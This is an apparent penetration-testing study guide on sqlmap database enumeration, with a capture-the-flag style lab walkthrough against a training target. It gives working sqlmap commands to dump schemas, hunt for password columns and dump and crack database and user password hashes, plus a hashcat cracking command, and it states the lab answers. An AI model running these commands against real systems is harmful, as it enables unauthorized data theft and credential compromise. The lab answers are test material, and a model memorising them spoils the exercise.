# Section 8 — Advanced Database Enumeration

---

## Schema Enumeration

```bash
# Full schema (all DBs, all tables, all columns + types)
sqlmap -u "TARGET" --schema

# Skip noise from system DBs
sqlmap -u "TARGET" --schema --exclude-sysdbs
```
> Dumps the entire database schema in one shot. `--exclude-sysdbs` hides MySQL's built-in system databases so you only see application data. Useful for quickly mapping an unfamiliar target database. Replace `TARGET` with your target's URL.

The output shows column names and data types. This makes it easy to spot password and credential columns at a glance.

---

## Searching (--search)

LIKE-based search across all databases. Three modes:

```bash
# Find databases matching a name
sqlmap -u "TARGET" --search -D admin

# Find tables matching a name
sqlmap -u "TARGET" --search -T user

# Find columns matching a name
sqlmap -u "TARGET" --search -C pass
```
> LIKE-based search across all databases. Use `-C pass` to find columns named `password`, `passwd`, `passphrase`, etc. without knowing the exact database or table structure. Replace `TARGET` with your target's URL and the search term with what you're hunting for.

> Search is case-insensitive and uses LIKE — `-C pass` matches `password`, `passwd`, `passphrase`, etc.

---

## Password Hash Cracking (built-in)

When sqlmap detects a password-like column during `--dump`, it offers to crack the hashes automatically:

```
[INFO] recognized possible password hashes in column 'password'
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
```

- 31 supported hash types (MD5, SHA1, SHA256, MySQL, bcrypt variants, etc.)
- Built-in wordlist with 1.4 million passwords at `/usr/share/sqlmap/data/txt/wordlist.tx_`
- Multi-process — uses all available CPU cores
- Option to use a custom dictionary or apply common suffixes

```bash
# Dump credentials table and auto-crack hashes
sqlmap -u "TARGET" --dump -D mydb -T users
```
> Dumps a specific table. When sqlmap detects password-like column content, it offers to crack the hashes automatically. Answer Y to let it try with its built-in 1.4M-entry dictionary. Replace `TARGET`, `mydb`, and `users` with your target's values.

---

## DBMS User Passwords (`--passwords`)

Dumps DB-level user accounts (e.g., `mysql.user`) and offers to crack them:

```bash
sqlmap -u "TARGET" --passwords --batch
```
> Dumps MySQL system-level user password hashes from `mysql.user` and attempts to crack them. These are database authentication accounts (root, etc.), not application users. Replace `TARGET` with your target's URL.

Output:
```
[*] root [1]:
    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
    clear-text password: testpass
```

> These are DB authentication accounts (MySQL root, debian-sys-maint, etc.) — different from app users stored in app tables.

---

## The "Just Do Everything" Switch

```bash
sqlmap -u "TARGET" --all --batch
```
> Full automated enumeration — dumps every database, table, column, and hash without any prompts. Use on full pentests with UNION injection. Avoid for CTFs or blind injection — it's extremely slow when each data byte requires multiple requests.

`--all` + `--batch` performs full enumeration with no prompts:
- All DBs, tables, columns dumped
- All hashes cracked
- All system info collected (banner, user, DBA status, file privs)
- Output saved to `~/.local/share/sqlmap/output/<host>/`

> Useful for full pentests where you have time. Painfully slow for blind injection — don't use in CTF.

---

## Lab — Case 1

**Target:** `154.57.164.72:30732`

### Q1 — Column containing "style" in its name

```bash
sqlmap -u "http://154.57.164.72:30732/case1.php?id=1" \
  --dbms=mysql --batch --technique=U --no-cast \
  --search -C style
```
> Searches all databases for columns containing "style" in their name. `--search -C` performs a LIKE search across `information_schema.columns`. Replace the IP, port, and search term for other targets.

Only one match across all databases:
```
Database: information_schema
Table: ROUTINES
| PARAMETER_STYLE |
```

**Q1 Answer:** `PARAMETER_STYLE`

---

### Q2 — Kimberly user's password

Dump the password hash with a WHERE filter, then crack it.

```bash
sqlmap -u "http://154.57.164.72:30732/case1.php?id=1" \
  --dbms=mysql --batch --technique=U --no-cast \
  -D testdb -T users -C name,password \
  --where="name LIKE 'Kimberly%'" --dump
```
> Dumps only matching rows from a specific table. `-C name,password` limits to two columns. `--where=` applies a SQL WHERE condition so only Kimberly's row is retrieved. Replace the IP, port, database, table, columns, and WHERE condition for other targets.

Result:
```
| Kimberly Wright | d642ff0feca378666a8727947482f1a4702deba0 |
```

The hash format is SHA1. Either let sqlmap crack it automatically by pressing Y at the prompt, or run hashcat yourself:
```bash
echo "d642ff0feca378666a8727947482f1a4702deba0" > hash.txt
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt
```
> Cracks a SHA1 hash with hashcat. `-m 100` is the SHA1 mode. Replace the hash value and path with your target's values. Use `-m 0` for MD5 or `-m 300` for MySQL 4.1+ hashes.

**Q2 Answer:** `Enizoom1609`

---

## Exam Notes

- `--schema --exclude-sysdbs` is the fastest way to map an unfamiliar DB
- `--search -C <keyword>` shortcuts hunting for sensitive columns (`pass`, `cc`, `ssn`, `key`, `secret`, `token`)
- `--where=` accepts standard SQL — use LIKE with `%` for partial matches
- sqlmap's built-in cracker handles SHA1, MD5, MySQL hashes natively — try it before reaching for hashcat
- The default sqlmap wordlist is 1.4M entries — rockyou.txt has 14M; switch wordlists if built-in fails
